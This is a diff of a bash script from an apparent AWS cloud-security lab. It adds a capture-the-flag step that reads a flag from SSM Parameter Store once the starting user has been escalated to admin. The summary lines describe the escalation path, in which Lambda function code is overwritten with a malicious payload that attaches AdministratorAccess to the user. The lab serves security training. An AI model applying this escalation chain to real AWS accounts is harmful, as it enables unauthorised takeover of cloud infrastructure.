@@ -339,13 +339,13 @@ echo "IAM changes can take time to propagate across AWS..."
 sleep 15
 echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 
-# [OBSERVATION] Step 13: Verify administrator access
+# [EXPLOIT] Step 13: Verify administrator access
 echo -e "${YELLOW}Step 13: Verifying administrator access${NC}"
 echo "Attempting to list IAM users to confirm admin access..."
 echo ""
-use_readonly_creds
+use_starting_creds
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
@@ -359,12 +359,29 @@ echo ""
 # Clean up temporary files (keep backup for cleanup script)
 rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
 
+# [EXPLOIT] Step 14: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/lambda-004-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
@@ -374,6 +391,7 @@ echo "4. Updated Lambda function code with malicious payload using lambda:Update
 echo "5. Manually invoked Lambda function using lambda:InvokeFunction to execute payload"
 echo "6. Malicious code ran with admin privileges and attached AdministratorAccess to our user"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER"
@@ -381,7 +399,7 @@ echo -e "  → (lambda:UpdateFunctionCode) → Modify $TARGET_LAMBDA code"
 echo -e "  → (lambda:InvokeFunction) → Execute modified function"
 echo -e "  → Function runs as $TARGET_ROLE"
 echo -e "  → (iam:AttachUserPolicy) → Attach AdministratorAccess"
-echo -e "  → Admin privileges obtained"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
